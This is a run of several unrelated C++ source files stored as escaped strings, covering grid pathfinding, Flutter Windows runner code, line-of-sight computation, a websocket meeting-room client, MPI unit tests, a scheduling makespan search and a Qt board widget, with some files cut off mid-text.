endpos);\n\t\t\t\tpTemp->pos.getf();\n\t\t\t\tpCurrent->pChild.push_back(pTemp);\n\t\t\t\tpTemp->pParent = pCurrent;\n\t\t\t\tbuff.push(pTemp);\n\t\t\t\t\n\t\t\t\tvis[pTemp->pos.x][pTemp->pos.y] = true;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tdelete pTemp;\n\t\t\t\tpTemp = nullptr;\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (buff.size()==0) {\n\t\t\t//\u5982\u679c\u5bfb\u627e\u5931\u8d25,\u65e0\u8def\u53ef\u8d70\n\t\t\treturn std::vector<Position>();\n\t\t}\n\t\t\n\t\telse {\n\t\t\tpCurrent = buff.top();\n\t\t\tbuff.pop();//\u5f39\u51fa\u8be5\u70b9, \u8bf4\u660e\u5176\u5df2\u7ecf\u88ab\u5bfb\u627e\u8fc7\n\t\t}\n\t\t\n\t\tif (pCurrent->pos == endpos) {//\u627e\u5230\u4e86\n\t\t\tisfind = true;\n\t\t\t\n\t\t\tbreak;\n\t\t}\n\t\t\n\t}\n\t\n\tif (isfind) {\n\t\twhile (pCurrent != nullptr) {\n\t\t\tPosition tmp(pCurrent->pos.x, pCurrent->pos.y);\n\t\t\tPath.push_back(tmp);\n\t\t\tpCurrent = pCurrent->pParent;\n\t\t}\n\t\t\n\t}\n\t\n\treturn Path;\n}\n\nstd::vector<std::string>ConvertToOperationCodeByPostion(std::vector<Position> Path, std::string opCode[4] ){\n\t\n\t\n\t\n\tstd::vector<std::string>anspath;\n\tPosition startcpy = Path.back();\n\tPath.pop_back();\n\twhile (!Path.empty()) {\n\t\tauto tmp = Path.back();\n\t\tPath.pop_back();\n\t\tif ((startcpy.x - tmp.x) > 0) {\n\t\t\t\n\t\t\tanspath.push_back(opCode[2]);\t\n\t\t}\n\t\telse if ((startcpy.x - tmp.x) < 0) {\n\t\t\tanspath.push_back(opCode[3]);\n\t\t}\n\t\telse if ((startcpy.y - tmp.y) > 0) {\n\t\t\tanspath.push_back(opCode[1]);\n\t\t}\n\t\telse if ((startcpy.y - tmp.y) < 0) {\n\t\t\tanspath.push_back(opCode[0]);\n\t\t}\n\t\tstartcpy = tmp;\n\t}\n\treturn anspath;\n}\n\nint main(int argc, char *argv[]){\n\t\n\t// if not assign opCode \n\t// \t\tuse default opCode\n\tstd::string opCode[5]={\"0\",\"1\",\"2\",\"3\"};  \n\t//2 means up  ,3 means down ,0 means right ,1 means left  \n\t\n\t\n\tstd::string mapdir;\n\tPosition s;\n\tPosition e;\n\tint mer=0,der=0;\n\t\n\tfor (int i = 1; i < argc; ++i) {\n\t\tstd::string arg = argv[i];\n\t\tif (arg == \"-m\") {\n\t\t\tmer++;\n\t\t\tif (i + 1 < argc) { // \u786e\u4fdd\u540e\u9762\u6709\u53c2\u6570\n\t\t\t\tmapdir = argv[++i]; // \u83b7\u53d6\u53c2\u6570\u5e76\u589e\u52a0i\n\t\t\t} else {\n\t\t\t\tstd::cerr << \"argument error\" << std::endl;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\tstd::fstream mp(mapdir,std::ios::in);\n\t\t\t\n\t\t\tif(!mp){\n\t\t\t\tstd::cerr<<\"invalid map dirction\\n\";\n\t\t\t\t\n\t\t\t}\n\t\t\tfor (int i = 0; i < n; i++) {\n\t\t\t\tfor (int j = 0; j < n; j++) {\n\t\t\t\t\tmp >> Map[i][j];\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t}\n\t\telse if (arg == \"-d\") {\n\t\t\tder++;\n\t\t\tif (i + 4 < argc) { \n\t\t\t\tint sx = std::stoi( argv[++i]);\n\t\t\t\tint sy = std::stoi(argv[++i]);\n\t\t\t\tint ex =std::stoi( argv[++i]);\n\t\t\t\tint ey =std::stoi( argv[++i]);\n\t\t\t\ts=Position(sx,sy);\n\t\t\t\te=Position(ex,ey);\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t} else {\n\t\t\t\tstd::cerr << \"argument error\" << std::endl;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\t\n\t\n\t\n\t\n\tauto p=GetPathbyPosition(s,e);\t\n\t\n\tstd::fstream ans(\"./ans.txt\",std::ios::out);\n\t\n\t\t\n\tfor(auto i:p){\n\t\tans<<\"(\"<<i.x<<\",\"<<i.y<<\") \";\n\t} \n\tans<<std::endl;\n\tauto o=ConvertToOperationCodeByPostion(p,opCode",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"simple_orm_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"line_of_sight.hpp\"\r\n\r\n#include <vector>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n\r\n#include \"line_algorithm.hpp\"\r\n\r\n// TODO: it may be useful to make some utility that handles the creation of things like this,\r\n// and add them to a personal library\r\n// Also, doesn't actually create a square. It can make rectangles. Bad name.\r\nstd::vector<std::vector<char>> create_square(int size_x, int size_y) {\r\n    std::vector<std::vector<char>> square;\r\n\r\n    for (int i = 0; i < size_x; i++)\r\n        square.push_back(std::vector<char>(size_y, 'X'));\r\n\r\n    return square;\r\n}\r\n\r\nvoid make_los(const std::vector<std::vector<char>>& terrain,\r\n    std::vector<std::vector<char>>& los, const std::vector<SB_LINE::Coordinate>& line) {\r\n    char tile_data = 0;\r\n    bool blocked = false;\r\n\r\n    for (int j = 0; j < line.size(); j++) {\r\n\r\n        int line_x = line[j].x, line_y = line[j].y;\r\n\r\n        tile_data = terrain[line_y][line_x];\r\n\r\n        if (tile_data == 1) {\r\n            blocked = true;\r\n            los[line_y][line_x] = 'W';\r\n        }\r\n\r\n        if (blocked == true)\r\n            break;\r\n        else\r\n            los[line_y][line_x] = ' ';\r\n\r\n    }\r\n}\r\n\r\nstd::vector<std::vector<char>> SB_LOS::line_of_sight(const std::vector<std::vector<char>>& terrain, int x, int y) {\r\n\r\n    std::vector<std::vector<char>> los = create_square(terrain.size(), terrain[0].size());\r\n\r\n    // TODO: This only makes sense if we have a contiguous array and the data in the array is large enough to impact cache hits\r\n    // The most optimal way to do this would be like so:\r\n    // Let H be values we explore when handling the top and bottom (horizontal traversal)\r\n    // and V be values we explore when handling the sides (vertical traversal)\r\n    // HHHHHHH\r\n    // H00000V\r\n    // V00000V\r\n    // V00000V\r\n    // V00000H\r\n    // HHHHHHH\r\n    // Additionally, when handling the sides, we can horizontally traverse like so:\r\n    // H000001\r\n    // 1000002\r\n    // 2000003\r\n    // 300000H\r\n\r\n    for (int z = 0; z < 2; z++) {\r\n        int row = z * (terrain.size() - 1);\r\n        for (int i = 0; i < terrain[row].size(); i++) {\r\n\r\n            std::vector<SB_LINE::Coordinate> line = SB_LINE::draw_line32b(x, i, y, row);\r\n            make_los(terrain, los, line);\r\n        }\r\n    }\r\n\r\n    for (int z = 0; z < 2; z++) {\r\n        int column = z * (terrain[0].size() - 1);\r\n        for (int i = 0; i < terrain.size(); i++) {\r\n\r\n            std::vector<SB_LINE::Coordinate> line = SB_LINE::draw_line32b(x, column, y, i);\r\n            make_los(terrain, los, line);\r\n        }\r\n    }\r\n\r\n\r\n    return los;\r\n}\r\n\r\n#define SB_LOS_TESTING\r\n#ifdef SB_LOS_TESTING\r\n\r\nvoid initialize_terrain(std::vector<std::vector<char>>& terrain, std::string input) {\r\n\r\n    std::ifstream in_file;\r\n\r\n    in_file.open(input);\r\n    if (!in_file.is_open())\r\n        throw;\r\n\r\n    std::string buffer;\r\n    while (std::getline(in_file, buffer)) {\r\n\r\n        std::vector<char> temp;\r\n\r\n        for (int i = 0; i < buffer.size(); i++) {\r\n            if (buffer[i] == '0')\r\n                temp.push_back(0);\r\n            else\r\n                temp.push_back(1);\r\n        }\r\n\r\n        terrain.push_back(temp);\r\n\r\n    }\r\n    in_file.close();\r\n}\r\n\r\nvoid print_terrain(const std::vector<std::vector<char>>& terrain) {\r\n\r\n    for (int i = 0; i < terrain.size(); i++) {\r\n        for (int j = 0; j < terrain[i].size(); j++) {\r\n            std::cout << (short)terrain[i][j];\r\n        }\r\n        std::cout << \"\\n\";\r\n    }\r\n\r\n}\r\nvoid print_los(const std::vector<std::vector<char>>& terrain) {\r\n\r\n    for (int i = 0; i < terrain.size(); i++) {\r\n        for (int j = 0; j < terrain[i].size(); j++) {\r\n            std::cout << terrain[i][j];\r\n        }\r\n        std::cout << \"\\n\";\r\n    }\r\n\r\n}\r\n\r\nvoid print_vector(const std::vector<SB_LINE::Coordinate>& vals) {\r\n\r\n    std::cout << \"(x, y) \";\r\n    for (int i = 0; i < vals.size(); i++) {\r\n        std::cout << \"(\" << vals[i].x << \", \" << vals[i].y << \") \";\r\n    }\r\n    std::cout << \"\\n\";\r\n}\r\n\r\nint main() {\r\n    std::vector<std::vector<char>> terrain;\r\n\r\n    initialize_terrain(terrain, \"infile.txt\");\r\n\r\n    print_terrain(terrain);\r\n    \r\n    std::cout << \"\\n\";\r\n\r\n    std::vector<std::vector<char>> los = SB_LOS::line_of_sight(terrain, 20, 10);\r\n\r\n    print_los(los);\r\n\r\n}\r\n#endif",
    "#include \"app_meeting_room.h\"\r\n\r\n#ifdef _WIN32\r\n#include <functional>\r\n#endif\r\n\r\n#include \"common_logger.h\"\r\n#include \"common_utils.h\"\r\n#include \"common_utf8.h\"\r\n\r\n#include \"ws_client.h\"\r\n#include \"app_room_user.h\"\r\n#include \"app_command.h\"\r\n#include \"app_event.h\"\r\n#include \"app_error.h\"\r\n\r\nstatic void websocket_received(const char *data, size_t len, void *arg)\r\n{\r\n\tLiveMeetingRoom *room = (LiveMeetingRoom *)arg;\r\n\r\n\tstd::string message(data, len);\r\n\troom->on_websocket_message(message);\r\n}\r\n\r\nstatic void websocket_event(int event, void*arg)\r\n{\r\n\tLiveMeetingRoom *room = (LiveMeetingRoom *)arg;\r\n\r\n\troom->on_websocket_event(event);\r\n}\r\n\r\nstatic void *websocket_thread_func(void *ptr)\r\n{\r\n\tLiveMeetingRoom *room = (LiveMeetingRoom *)ptr;\r\n\troom->websocket_pulse_loop();\r\n\r\n\treturn 0;\r\n}\r\n\r\nstatic void *receive_thread_func(void *ptr)\r\n{\r\n\tLiveMeetingRoom *room = (LiveMeetingRoom *)ptr;\r\n\troom->receive_loop();\r\n\r\n\treturn 0;\r\n}\r\n\r\n////////////////////////////////////////////////////////////\r\n\r\nLiveMeetingRoom::LiveMeetingRoom()\r\n{\r\n\tm_initialized = false;\r\n\tm_ws_thread_running = false;\r\n\tm_websocket_client = NULL;\r\n\tm_receive_thread_running = false;\r\n\tm_rtp_audio_sender = NULL;\r\n\tm_rtp_video_sender = NULL;\r\n\tm_rtp_send_initialized = false;\r\n\r\n\tm_event_callback_func = NULL;\r\n\tm_event_callback_arg = NULL;\r\n\r\n\tm_signal_callback_func = NULL;\r\n\tm_signal_callback_arg = NULL;\r\n\r\n\tm_is_signal_running = false;\r\n\tm_prev_signal_time = 0;\r\n\tm_aac_callback = NULL;\r\n\tm_aac_callback_arg = NULL;\r\n\tm_h264_callback = NULL;\r\n\tm_h264_callback_arg = NULL;\r\n\r\n#ifdef _WIN32\r\n#else\r\n\tpthread_mutex_init(&m_receive_mutex, NULL);\r\n#endif\r\n}\r\n\r\nLiveMeetingRoom::~LiveMeetingRoom()\r\n{\r\n#ifdef _WIN32\r\n#else\r\n\tpthread_mutex_destroy(&m_receive_mutex);\r\n#endif\r\n}\r\n\r\nvoid LiveMeetingRoom::free_context()\r\n{\r\n\tif (m_ws_thread_running)\r\n\t{\r\n\t\tm_ws_thread_running = false;\r\n#ifdef _WIN32\r\n\t\tm_websocket_thread.join();\r\n#else\r\n\t\tpthread_join(m_websocket_thread, NULL);\r\n#endif\r\n\t}\r\n\r\n\tif (m_receive_thread_running)\r\n\t{\r\n\t\tm_receive_thread_running = false;\r\n#ifdef _WIN32\r\n\t\tm_receive_thread.join();\r\n#else\r\n\t\tpthread_join(m_receive_thread, NULL);\r\n#endif\r\n\t}\r\n\r\n\tif (m_websocket_client)\r\n\t{\r\n\t\tLOG_DEBUG(\"delete m_websocket_client\");\r\n\t\tdelete m_websocket_client;\r\n\t\tm_websocket_client = NULL;\r\n\t}\r\n\r\n\tif (m_rtp_audio_sender)\r\n\t{\r\n\t\tLOG_DEBUG(\"delete m_rtp_audio_sender\");\r\n\t\tdelete m_rtp_audio_sender;\r\n\t\tm_rtp_audio_sender = NULL;\r\n\t}\r\n\r\n\tif (m_rtp_video_sender)\r\n\t{\r\n\t\tLOG_DEBUG(\"delete m_rtp_video_sender\");\r\n\t\tdelete m_rtp_video_sender;\r\n\t\tm_rtp_video_sender = NULL;\r\n\t}\r\n\r\n\tstd::map<std::string, RoomUser *>::iterator it = m_other_users_map.begin();\r\n\tfor (; it != m_other_users_map.end(); it++)\r\n\t{\r\n\t\tdelete it->second;\r\n\t}\r\n\tm_other_users_map.clear();\r\n\r\n\tm_rtp_send_initialized = false;\r\n\tm_initialized = false;\r\n}\r\n\r\nvoid LiveMeetingRoom::un_initialize()\r\n{\r\n\tfree_context();\r\n}\r\n\r\nbool LiveMeetingRoom::is_signal_connected()\r\n{\r\n\tif (m_websocket_client)\r\n\t{\r\n\t\treturn m_websocket_client->is_connected();\r\n\t}\r\n\telse\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n}\r\n\r\nvoid LiveMeetingRoom::stop_receive()\r\n{\r\n\tif (m_receive_thread_running)\r\n\t{\r\n\t\tm_receive_thread_running = false;\r\n#ifdef _WIN32\r\n\t\tm_receive_thread.join();\r\n#else\r\n\t\tpthread_join(m_receive_thread, NULL);\r\n#endif\r\n\t}\r\n}\r\n\r\nLiveMeetingRoom *LiveMeetingRoom::get_instance()\r\n{\r\n\tstatic LiveMeetingRoom instance;\r\n\treturn &instance;\r\n}\r\n\r\nvoid LiveMeetingRoom::set_event_callback_func(ConferenceEventCallback func, void *arg)\r\n{\r\n\tthis->m_event_callback_func = func;\r\n\tthis->m_event_callback_arg = arg;\r\n}\r\n\r\nvoid LiveMeetingRoom::set_signal_callback_func(ConferenceSignalCallback func, void *arg)\r\n{\r\n\tthis->m_signal_callback_func = func;\r\n\tthis->m_signal_callback_arg = arg;\r\n}\r\n\r\nvoid LiveMeetingRoom::set_h264_receive_callback(OnH264ReceiveCallback func, void* arg)\r\n{\r\n\tm_h264_callback = func;\r\n\tm_h264_callback_arg = arg;\r\n}\r\n\r\nvoid LiveMeetingRoom::set_aac_receive_callback(OnAACReceiveCallback func, void* arg)\r\n{\r\n\tm_aac_callback = func;\r\n\tm_aac_callback_arg = arg;\r\n}\r\n\r\nvoid LiveMeetingRoom::websocket_pulse_loop()\r\n{\r\n\twhile (m_ws_thread_running)\r\n\t{\r\n\t\tm_websocket_client->pulse(50);\r\n\t}\r\n}\r\n\r\nvoid LiveMeetingRoom::receive_loop()\r\n{\r\n\tuint32_t count = 0;\r\n\twhile (m_receive_thread_running)\r\n\t{\r\n\t\t{\r\n#ifdef _WIN32\r\n\t\t\tstd::unique_lock<std::mutex> lock(m_receive_mutex);\r\n#else\r\n\t\t\tpthread_mutex_lock(&m_receive_mutex);\r\n#endif\r\n\t\t\tstd::map<std::string, RoomUser *>::iterator it = m_other_users_map.begin();\r\n\t\t\tfor (; it != m_other_users_map.end(); it++)\r\n\t\t\t{\r\n\t\t\t\tRoomUser *usr = it->second;\r\n\t\t\t\tusr->receive_audio();\r\n\t\t\t\tusr->receive_video();\r\n\t\t\t\tif (count % 2000 == 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tusr->nat_pinhole();\r\n\t\t\t\t}\r\n\t\t\t}\r\n#ifdef _WIN32\r\n#else\r\n\t\t\tpthread_mutex_unlock(&m_receive_mutex);\r\n#endif\r\n\t\t\tcount++;\r\n\t\t}\r\n\r\n\t\t//sleep 4 milliseconds\r\n#ifdef _WIN32\r\n\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(4));\r\n#else\r\n\t\tusleep(1000 * 8);\r\n#endif\r\n\t}\r\n}\r\n\r\nbool LiveMeetingRoom::initialize(const std::string &websocket_ip, uint16_t websocket_",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#define BOOST_TEST_MODULE AllTests\n#include <boost/test/included/unit_test.hpp>\n#include <cmath>\n#include <iostream>\n#include \"SolverCG.h\"\n#include \"LidDrivenCavity.h\"\n#include <mpi.h>\n#include <omp.h>\n\n/*!*****************************************************************************\n * @brief  Define the indexing operations for global matrices, in row-major format\n * @note  indexing from (0,0) in bottom left corner.\n *******************************************************************************/\n#define IDX(i,j) ((j)*Nx + (i))\n\n\n\n/**\n * @struct GlobalMPIFixture\n * @brief Initializes and finalizes the MPI environment.\n *\n * \n * Needed for the BOOST unit tests to function with mpi correctly.\n * Makes MPI initialise and shut down correclty for the unit tests.\n * \n */\nstruct GlobalMPIFixture {\n    \n    /**\n     * @brief Constructor for GlobalMPIFixture.\n     * Initializes MPI with MPI_Init.\n     */\n    GlobalMPIFixture() {\n        MPI_Init(NULL, NULL);\n    }\n    \n    /**\n     * @brief Destructor for GlobalMPIFixture.\n     * Terminates MPI with MPI_Finalize().\n     */\n    ~GlobalMPIFixture() {\n        MPI_Finalize();\n    }\n};\n\nBOOST_GLOBAL_FIXTURE(GlobalMPIFixture);\n\n\n/**\n * @brief Prints a matrix.\n *\n * Mainly used for debugging and evaluating the final result for verification.\n * \n * Assumes row-major indexing, with 0,0 in the bottom left corner.\n * \n * @param   array   pointer to matrix we wish to print.\n * @param   Nx      Size of matrix in the x direction\n * @param   Ny      Size of matrix in the y direction\n */\nvoid printMatrixTest(const double* array, int Nx, int Ny) {\n    for (int j = Ny - 1; j >= 0; --j) {\n        for (int i = 0; i < Nx; ++i) {\n            int index = j * Nx + i;\n            // Use std::fixed and std::setprecision to control the number format\n            // std::setw(10) ensures that each number takes up 10 characters' space for alignment\n            std::cout << std::setw(10) << std::fixed << std::setprecision(4) << array[index] << \" \";\n        }\n        std::cout << std::endl; // Newline after each row\n    }\n}\n\n\n/**\n * @brief Calculates analytical solution for Solver.\n *\n * Uses discretised version of sin(pi k x) sin (pi l y)\n * \n * @param   i       x location index\n * @param   j       y location index\n * @param   dx      discretisation in y direction\n * @param   dxy     discretisation in y direction\n * @param   k       coefficient k\n * @param   l       coefficient l\n */\ndouble analytical_solution(int i, int j, double dx, double dy, int k, int l) {\n    return sin(M_PI * k * i * dx) * sin(M_PI * l * j * dy);\n}\n\n\n/**\n * @brief Tests the MPI access of BOOST tests, and initialisaion of MPI.\n *\n * Used to debug the unit tests themselves and to make sure \n * MPI is available in the unit tests.\n * \n */\nBOOST_AUTO_TEST_CASE(MPITest) {\n    int world_rank;\n    int world_size;\n    \n    MPI_Comm_rank( MPI_COMM_WORLD, &world_rank );\n    MPI_Comm_size( MPI_COMM_WORLD, &world_size );\n    \n    if (world_rank == 0) cout << \"1. MPI Initialisation test\" <<  endl;\n    \n    BOOST_CHECK( world_size != 0);\n}\n\n\n/**\n * @brief tests SolverCG class\n *\n * Uses the initial comndition v = - pi^2 (k^2 + l^2) sin(pi k x) sin(pi l y)\n * For simplicity, calls a new AdvanceTest() functionl, and sets the final time to one delta_t,\n * so that it just solves the poisson and nothing else.\n * \n */\nBOOST_AUTO_TEST_CASE(SinusoidalTest) {\n    int world_rank;\n    int world_size;\n    \n    MPI_Comm_rank( MPI_COMM_WORLD, &world_rank );\n    MPI_Comm_size( MPI_COMM_WORLD, &world_size );\n    \n    if (world_rank == 0) cout << \"2. Testing sinusoidal input for Poisson Equation\" << endl;\n    \n    const int Nx = 20; // Grid size in x-direction\n    const int Ny = 20; // Grid size in y-direction\n    const double dx = 1.0 / (Nx - 1);\n    const double dy = 1.0 / (Ny - 1);\n    const int k = 3;\n    const int l = 3;\n    const double tolerance = 0.01;\n    const int Npts = Nx * Ny;\n    double* s_analytical = new double[Npts]; //stores analytical answer for test case\n    double* v = new double[Npts]; \n    double* s = new double[Npts]; \n    \n    \n    //Set analytical solution\n    for (int i = 0; i < Nx; ++i) {\n        for (int j = 0; j < Ny; ++j) {\n            s_analytical[IDX(i,j)] = -analytical_solution(i, j, dx, dy, k, l);\n        }\n    }\n    \n    \n    \n    \n    int n_rows = sqrt(world_size);\n    MPI_Comm cart_comm;\n    int dims[2] = {n_rows, n_rows};                 // p rows * p cols\n    int periods[2] = {0, 0};                        // Non-periodic\n    int reorder = 1;                                // reordering\n    int coords[2];                               \n    MPI_Cart_create(MPI_COMM_WORLD, 2, dims, periods, reorder, &cart_comm);\n    MPI_Cart_coords(cart_comm, world_rank, 2, coords);\n\n\n    LidDrivenCavity* solver = new LidDrivenCavity();\n    solver->SetDomainSize(1.0, 1.0);\n    solver->SetGridSize(Nx, Ny);\n    solver->SetTimeStep(0.001);\n    solver->SetFinalTime(0.001);\n    solver->SetReynoldsNumber(10);\n    solver->SetMPI(cart_comm);",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <sstream>\n#include <chrono>\n#include \"../include/ConfigMatrix.h\"\n#include \"../include/MyVector.h\"\n#include \"../include/DynTable.h\"\n#include \"../include/IPInstance.h\"\n#include \"../include/Defines.h\"\n#include \"../include/Logger.h\"\n\n#ifdef _WIN32\n#include <direct.h>         // for _getcwd()\n#include <windows.h>        // for MAX_PATH\n#define GETCWD _getcwd\n#else\n#include <filesystem>\n#include <unistd.h>\n#define GETCWD getcwd\n#define MAX_PATH 4096\n#endif\n\nusing namespace std;\nusing std::cout;\n\nLogger* globalLogger;\n\n\nMATRIX readFile\n(\n    std::string inputFileName\n)\n{\n    // Matrix to save input vectors n, p, m, s\n    MATRIX inputVectors = { {}, {}, {}, {} };\n\n    INFILE inputFile(inputFileName);\n\n    if (!inputFile.is_open())\n    {\n        cout << \"Error reading input file: \" << inputFileName << std::endl;\n        return inputVectors;\n    }\n\n    // Read machine data from file and save values in matrix\n    STRING line;\n\n    int numMachines = 0;\n    if (std::getline(inputFile, line))\n    {\n        INSTRING(line) >> numMachines;\n    }\n\n    while (numMachines > 0 && std::getline(inputFile, line))\n    {\n        INSTRING iss(line);\n        STRING token;\n\n        // split line at \",\"\n        if (std::getline(iss, token, ','))\n        {\n            int machines;\n            INSTRING(token) >> machines;\n            inputVectors[2].push_back(machines);\n            numMachines -= machines;\n        }\n        if (std::getline(iss, token, ','))\n        {\n            int speed;\n            INSTRING(token) >> speed;\n            inputVectors[3].push_back(speed);\n        }\n    }\n\n    // Read job data from file and save values in matrix\n    int numJobs = 0;\n    if (std::getline(inputFile, line))\n    {\n        INSTRING(line) >> numJobs;\n    }\n\n\n    while (numJobs > 0 && std::getline(inputFile, line))\n    {\n        INSTRING iss(line);\n        STRING token;\n\n        // split line at \",\"\n        if (std::getline(iss, token, ','))\n        {\n            int jobs;\n            INSTRING(token) >> jobs;\n            inputVectors[0].push_back(jobs);\n            numJobs -= jobs;\n        }\n        if (std::getline(iss, token, ','))\n        {\n            int proTime;\n            INSTRING(token) >> proTime;\n            inputVectors[1].push_back(proTime);\n        }\n\n    }\n\n    inputFile.close();\n\n    return inputVectors;\n}\n\n\n\ndouble binarySearchForOptMakespan\n(\n    MyVector* numJobs,\n    MyVector* jobSizes,\n    MyVector* numMachines,\n    MyVector* speeds\n)\n{\n    // get dimensions\n    UINT numMachineTypes = numMachines->getSize();\n    UINT numJobTypes = numJobs->getSize();\n\n    // begin time measurement\n    auto totalStart = chrono::steady_clock::now();\n    auto stop = chrono::steady_clock::now();\n    auto main_ms = chrono::duration_cast<chrono::milliseconds>(stop - totalStart);\n\n    // determine starting search interval\n\n    // determine average completion time\n    double sumProcessingTime = 0;\n    int pmax = 1;\n    for (UINT i = 0; i < numJobTypes; i++)\n    {\n        sumProcessingTime += numJobs->get(i) * jobSizes->get(i);\n        pmax = max(pmax, jobSizes->get(i));\n    }\n    double sumSpeeds = 0;\n    for (UINT j = 0; j < numMachineTypes; j++)\n    {\n        sumSpeeds += numMachines->get(j) * speeds->get(j);\n    }\n    double avg = sumProcessingTime / sumSpeeds;\n\n\n\n    //determine least common multiple of all speed values\n    int lcmSpeeds = speeds->getLCM();\n\n    // upper bound = avg + pmax\n    UINT scaledUb = (UINT)lcmSpeeds * (avg + pmax);\n    // lower bound = avg\n    UINT scaledLb = (UINT)std::floor(lcmSpeeds * avg);\n\n\n    while (scaledUb != scaledLb)\n    {\n        // calculate middle of the search interval and the corresponding makespan\n        UINT scaledMiddle = (UINT)std::floor((scaledUb + scaledLb) / 2);\n        double makespan = scaledMiddle / (double)lcmSpeeds;\n\n        globalLogger->log(\"The guessed makespan is \", makespan, LogTypeInfo);\n        //cout << \"guessed makespan = \" << makespan << endl;\n\n        // determine configuration matrix A\n        ConfigMatrix A(numJobs, jobSizes, numMachines, speeds, makespan);\n\n        // generate IP-instance\n        IPInstance inst(&A, numJobs, numMachines);\n\n        auto start = chrono::steady_clock::now();\n        // determine feasibility of the IP-instance\n        bool feasible = inst.solve();\n        auto stop = chrono::steady_clock::now();\n        main_ms = main_ms + chrono::duration_cast<chrono::milliseconds>(stop - start);\n\n        // update search interval\n        if (feasible)\n        {\n            scaledUb = scaledMiddle;\n        }\n        else\n        {\n            scaledLb = scaledMiddle + 1;\n        }\n    }\n\n    // end time measurement and save used time\n    auto totalStop = chrono::steady_clock::now();\n    auto total_ms = chrono::duration_cast<chrono::milliseconds>(totalStop - totalStart);\n    auto preprocessing_ms = chrono::duration_cast<chrono::milliseconds>(total_ms - main_ms);\n\n    globalLogger->log(\"This test too",
    "#include \"boardsquare.h\"\n#include \"Variables.h\"\n\nBoardSquare::BoardSquare(QGraphicsScene *scene, int size, int x, int y, int n, int m)\n{\n    xPos = x;\n    yPos = y;\n    squaresize = size;\n    boardScene = scene;\n    doAction = 0;\n    nArray = n;\n    mArray = m;\n    setFlag(ItemIsSelectable);\n    boardScene->addItem(this);\n}\n\nQRectF BoardSquare::boundingRect() const\n{\n    return QRectF(xPos, yPos, squaresize, squaresize);\n}\n\nvoid BoardSquare::paint(QPainter *painter, const QStyleOptionGraphicsItem *, QWidget *)\n{\n    QRectF rec = boundingRect();\n    QBrush brush(Qt::gray);\n    if (doAction == 0)\n    {\n        brush.setColor(Qt::gray);\n    }\n    else if (doAction == 64)\n    {\n        brush.setColor(Qt::green);\n    }\n    else if (doAction == 1)\n    {\n        brush.setColor(Qt::blue);\n    }\n    else if (doAction == 2)\n    {\n        brush.setColor(Qt::red);\n    }\n    painter->fillRect(rec,brush);\n    painter->drawRect(rec);\n}\n\nvoid BoardSquare::mousePressEvent(QGraphicsSceneMouseEvent *event)\n{\n    update();\n    QGraphicsItem::mousePressEvent(event);\n}\n\nvoid BoardSquare::mouseReleaseEvent(QGraphicsSceneMouseEvent *event)\n{\n    emit Clicked(nArray, mArray);\n    update();\n    